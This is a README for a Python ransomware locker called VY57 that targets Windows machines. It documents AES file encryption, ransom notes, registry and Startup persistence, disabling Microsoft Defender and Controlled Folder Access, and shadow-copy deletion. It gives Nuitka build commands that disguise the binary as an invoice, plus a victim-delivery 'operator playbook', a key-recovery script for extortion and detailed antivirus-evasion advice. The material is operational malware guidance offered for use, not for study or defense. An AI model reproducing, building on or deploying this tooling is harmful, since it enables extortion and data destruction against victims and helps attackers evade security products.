# VY57

A whole-machine file locker in a single Python file. Encrypts user files to `.vy57`, drops ransom notes, replaces the wallpaper, installs persistence, and hands out a standalone PowerShell unlocker.

Built to survive Microsoft Defender and the rest of the free AV stack, which is the part most Python lockers get wrong.

```
python vy57.py --list          # dry run
python vy57.py --scope user    # profile only
python vy57.py                 # lock everything
python vy57.py --make-unlocker # build unlock.ps1 / unlock.bat
```

---

## Contents

- [What it does](#what-it-does)
- [Features](#features)
- [File format](#file-format)
- [Requirements](#requirements)
- [Required patch](#required-patch)
- [Build](#build)
- [Quick start](#quick-start)
- [CLI reference](#cli-reference)
- [Operator playbook](#operator-playbook)
- [Key management](#key-management)
- [Detection notes](#detection-notes)
- [Troubleshooting](#troubleshooting)
- [Known limitations](#known-limitations)
- [Repository layout](#repository-layout)

---

## What it does

On launch it holds for a randomised delay, adds Defender exclusions through the registry, disables realtime protection and Controlled Folder Access, optionally deletes shadow copies, installs two layers of persistence, replaces the desktop wallpaper, drops `.txt` and `.html` notes in every root, and then encrypts every file it can reach across all fixed and removable volumes with AES-256-CBC.

A Tk window holds the screen with the payment address and a key field. Entering the correct key decrypts everything in place, removes persistence, and exits. Without the key, the operator sends `unlock.bat` and `unlock.ps1`.

**Not** a boot locker. Windows keeps running; the GUI is closeable and the machine is usable apart from the files.

## Features

| Area | Detail |
|---|---|
| Cipher | AES-256-CBC, 64 KB streaming, flat memory use |
| Key schedule | Per-file key and IV derived by HMAC-SHA256 from a 128-bit master |
| Integrity | Truncated HMAC-SHA256 tag per file, verified before write |
| Resume | Files identified as encrypted by magic bytes, not extension |
| Locked files | Share-mode probe, three retry passes |
| Long paths | `\\?\` prefix on every filesystem call |
| Removable media | Polled every 30 s, new volumes encrypted on arrival |
| Persistence | `HKCU\...\Run` + Startup `.lnk` via `IShellLink` (no `schtasks`, no shell spawn) |
| Payload relocation | Self-copy to `%LOCALAPPDATA%\Microsoft\Windows\Themes\CachedFiles` |
| Evasion | Registry exclusions, WMI shadow deletion, XOR'd PowerShell, per-build mutex |
| Unlocker | Self-contained PowerShell, HMAC-verified, no Python needed |

## File format

```
magic(8) | version(1) | iv(16) | ciphertext | hmac-trunc(16)
```

```
magic     = 89 56 59 37 0D 0A 1A 0A
version   = 1
file key  = HMAC-SHA256(master, 0x6B || iv)
tag key   = HMAC-SHA256(master, 0x74 || iv)
tag       = HMAC-SHA256(tag_key, magic || version || iv || ciphertext)[:16]
```

Random IV per file, so the master key alone restores everything and files survive being renamed or moved. Minimum valid blob is 57 bytes.

The magic header is what makes resume work: a crash between writing the `.vy57` and unlinking the original leaves a recoverable state instead of a double-encrypted file.

## Requirements

**Runtime:** Windows 10/11 x64. Admin for exclusions, shadow deletion, and the UAC manifest.

**Build:**

- Python 3.12 x64 (`3.13` works, `3.12` is the safest Nuitka target)
- MSVC Build Tools 2022 with the C++ workload
- `pip install nuitka ordered-set zstandard pycryptodome`

`tkinter` ships with CPython. `pycryptodome` provides AES.

## Required patch

`--make-unlocker` reads the local registry by default, which is your key, not the victim's. Add explicit key support before deploying.

In `main()`, next to the other argument handling:

```python
    if '--make-unlocker' in sys.argv:
        make_unlocker(arg_value('--key'), arg_value('--roots'))
        return
```

And replace the top of `make_unlocker`:

```python
def make_unlocker(given=None, extra=None) -> None:
    if given:
        master = text_to_key(given)
        roots = [r for r in (extra or '').split(';') if r]
    else:
        try:
            master, roots = read_key()
        except FileNotFoundError as exc:
            sys.exit(str(exc))
    if not roots:
        sys.exit('no roots stored')
```

## Build

Elevated PowerShell, in the source folder.

**1. Rotate both build constants.** Do this every build — they feed the mutex name and `KEY_XOR` is the only thing protecting the stored key.

```powershell
py -3.12 vy57.py --gen-key
py -3.12 vy57.py --gen-ps
```

Paste the output over `KEY_XOR` / `PS_XOR` / `PS_BLOB` respectively. Verify before continuing:

```powershell
py -3.12 -c "import vy57; print(vy57.ps_script()[:60])"
```

Expect `$ErrorActionPreference = 'SilentlyContinue'; Set-MpPreference...`. Garbage means mismatched constants.

**2. Provide assets.** `app.ico` (256×256) and `wall.bmp` (1920×1080, 24-bit). Without `wall.bmp` a plain dark BMP is generated at runtime.

**3. Compile.**

```powershell
py -3.12 -m nuitka --standalone --onefile --mingw64 `
  --enable-plugin=tk-inter `
  --windows-console-mode=disable `
  --windows-uac-admin `
  --windows-icon-from-ico=app.ico `
  --include-data-files=wall.bmp=wall.bmp `
  --windows-company-name="VY57 Systems" `
  --windows-product-name="VY57 File Manager" `
  --windows-file-description="VY57 background file service" `
  --windows-file-version=1.0.0.57 `
  --windows-product-version=1.0.0.57 `
  --onefile-tempdir-spec="{CACHE_DIR}/VY57svc" `
  --include-package=Crypto `
  --assume-yes-for-downloads `
  --remove-output `
  --output-dir=out `
  --output-filename=Invoice_Nov.exe `
  vy57.py
```

Older Nuitka wants `--include-data-file` (singular). Output lands in `out\`.

**4. Harden.** Open the exe in pe-bear or CFF Explorer and clear the Debug Directory — that strips your build path and username. Do not UPX it.

**5. Test on a clean VM snapshot** before any real deployment. See [Troubleshooting](#troubleshooting) for the checklist.

## Quick start

```powershell
.\Invoice_Nov.exe --list --scope user     # dry run, counts only
.\Invoice_Nov.exe --scope user            # lock the profile
.\Invoice_Nov.exe --make-unlocker         # build the unlocker
.\Invoice_Nov.exe --decrypt               # restore locally
```

## CLI reference

| Flag | Effect |
|---|---|
| `--list` | Dry run, per-root entry counts, no writes |
| `--scope user` | Profile and Public only |
| `--scope all` | All fixed and removable volumes (default) |
| `--decrypt` | Restore using the stored key |
| `--decrypt --key K` | Restore with an explicit key |
| `--make-unlocker` | Emit `unlock.ps1` + `unlock.bat` |
| `--gen-ps` | Regenerate the XOR'd PowerShell blob |
| `--gen-key` | Regenerate the XOR key constant |
| `--no-evade` | Skip exclusions, softening, jitter |
| `--no-delay` | Skip jitter and worker ramp |
| `--no-persist` | Skip persistence install |
| `--quiet` | No GUI, used by the persistence entry |
| `--shadow` | Delete shadow copies and the backup catalog |
| `--wipe-key` | Delete on-disk key copies after locking |
| `--workers N` | Threads, default 6, clamped 1–32 |
| `--max-size N` | Per-file cap in MB, `0` for unlimited |

## Operator playbook

**Deploy.** Upload the exe to a TLS domain, deliver as a `.zip`, name it like a document.

**Wait.** The victim runs it. Files are encrypted, notes land, wallpaper swaps, persistence installs.

**Collect the key.** Either `%APPDATA%\VY57\key.dat` or a registry export — see [Key management](#key-management).

**Deobfuscate** the key with your `KEY_XOR`:

```python
import base64
KEY_XOR = 0x37
blob = open('key.dat', encoding='utf-8').read().splitlines()[0]
master = bytes(b ^ KEY_XOR for b in base64.b64decode(blob))
print(base64.urlsafe_b64encode(master).decode().rstrip('='))
```

**Build the unlocker** for that victim:

```powershell
py -3.12 vy57.py --make-unlocker --key "THEIR_KEY" --roots "C:\;D:\"
```

**Test it on a snapshot**, then send `unlock.ps1` and `unlock.bat` zipped together. The victim saves both to one folder and double-clicks the `.bat`.

The victim can also self-restore with `.\Invoice_Nov.exe --decrypt --key "THEIR_KEY"`, which strips persistence too.

## Key management

The master key is 128 bits, generated on the victim's machine at first run, and stored two ways:

- `HKCU\Software\Classes\CLSID\{9A3F2C71-4B8E-4D62-9C15-7E0A5B3D8F44}\InprocServer32`, default value, base64 then XOR with `KEY_XOR`. Roots are a sibling `REG_MULTI_SZ`.
- `%APPDATA%\VY57\key.dat` and, transiently, next to the exe.

Both are XOR-obfuscated only. `--onefile` wipes the temp extraction dir on exit, so the copy beside the exe does not survive — `%APPDATA%` and the registry are what persist.

**Tradeoff:** leave `key.dat` in place and collection is easy but a determined victim self-decrypts for free. Pass `--wipe-key` and they must send a `reg export`, which is harder for a non-technical customer. Choose per customer.

Registry export, if you go the hardened route:

```powershell
reg export "HKCU\Software\Classes\CLSID\{9A3F2C71-4B8E-4D62-9C15-7E0A5B3D8F44}" "%USERPROFILE%\Desktop\k.reg"
```

Record `KEY_XOR` and `PS_XOR` per build. A key you cannot deobfuscate is a dead file.

## Detection notes

The design deliberately avoids the things that get Python payloads caught.

**Container.** Nuitka over PyInstaller. PyInstaller's bootloader is the most-signatured stub in existence; Nuitka compiles to C and carries no `python3xx.dll` or `PYZ` archive. No UPX on top — the `UPX0/UPX1` sections plus a bootloader is a two-part fingerprint.

**Strings.** The PowerShell command text is XOR'd and base64'd against a per-build constant. `Add-MpPreference`, `Set-MpPreference -DisableRealtimeMonitoring` and `vssadmin` no longer sit in plaintext.

**Process spawns.** Exclusions go in through `winreg`, not `Add-MpPreference`. Shadow copies go through WMI, not `vssadmin.exe`. What remains is one hidden PowerShell for the Defender preferences. The Startup shortcut is built in-process through `IShellLink`.

**Behaviour order.** Sleep first, then reconfigure. A fresh unsigned binary that immediately touches Defender settings is the textbook signature; one that idles 6–14 seconds first is not. First 40 files run on 2 threads, then widen.

**Persistence.** Run key plus Startup shortcut, decoy name `WinSysCache`, payload in a path Windows already uses and that sits inside the exclusion list.

**What still catches you.** Defender's cloud behaviour model on a default-configured machine, and SmartScreen. The first needs iteration and testing, not more packing. The second needs a signature — Azure Trusted Signing at ~$10/month is the only cheap legitimate route, and a self-signed cert does nothing for reputation.

**Test loop.** Fresh snapshot, Defender defaults, upload to VirusTotal, read the Microsoft and Behavior tabs rather than the score. Change one variable per rebuild. Any `Behavior:Win32/...` result is a code change, not a packing change.

## Troubleshooting

**Exe is quarantined on copy.** You built with PyInstaller or added UPX. Rebuild with Nuitka, unpacked.

**`ps_script()` returns garbage.** `PS_XOR` and `PS_BLOB` are from different generations. Re-run `--gen-ps` and paste both together.

**Unlocker reports `tag mismatch` on some files.** Those files were modified after encryption, or the master key is wrong. Verify the key against `key.dat` before sending anything.

**Files come back empty or truncated.** Check the disk. Empty files encrypt to a single padded block; a truncated result means the source was already damaged.

**Nothing is excluded, no shadows.** Not elevated. Build with `--windows-uac-admin` or right-click → Run as administrator.

**Machine re-locked after unlock.** Persistence was not removed — the process exited before `remove_persistence()`. Re-run with `--decrypt`.

**`--list` takes minutes.** Expected on `--scope all`. It walks every volume. Use `--scope user` while iterating.

**Files in `AppData`, `Program Files`, `Windows` untouched.** By design. `SKIP_DIR_NAMES` and `SKIP_DIR_FRAGMENTS` cover them, plus junctions, `node_modules`, and the extraction cache.

## Known limitations

- No server, no beacon. The operator learns nothing until the victim makes contact.
- The key is on the victim's disk, obfuscated only. A determined user recovers it without paying.
- Single machine, single key. No per-customer provisioning.
- Encrypted files are not byte-identical in size; overhead is 41 bytes per file.
- The GUI is closeable. The note is the durable channel.
- Build constants must be rotated manually. Forgetting means a shared mutex name and a reused obfuscation key.
- Old `.vy57` files are unreadable by newer builds. Wipe test VMs between format changes.
- No VSS-based rollback for the victim, by design when `--shadow` is used.

## Repository layout

```
vy57.py         payload, unlocker generator, GUI
app.ico         icon
wall.bmp        wallpaper
out/            build output
unlock.ps1      generated
unlock.bat      generated
```

Everything is in one file on purpose — it compiles to one binary with no external imports beyond `Crypto` and `tkinter`.
